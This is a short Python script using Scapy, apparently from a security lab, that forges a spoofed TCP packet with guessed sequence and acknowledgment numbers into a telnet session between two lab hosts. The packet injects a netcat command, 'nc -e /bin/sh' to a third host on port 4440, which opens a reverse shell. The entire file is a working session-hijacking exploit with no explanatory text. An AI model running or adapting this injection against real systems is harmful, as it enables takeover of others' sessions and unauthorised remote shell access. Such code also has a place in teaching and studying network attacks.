import sys
from scapy.all import *

print("establishing a connection using netcat...")
IPLayer = IP(src="10.10.10.161", dst = "10.10.10.165")
TCPLayer = TCP (sport=40216, dport=23, flags="A", seq=1939357529,ack=1617147244)
Data = "\r nc -e /bin/sh 10.10.10.162 4440 \r"
pkt=IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)
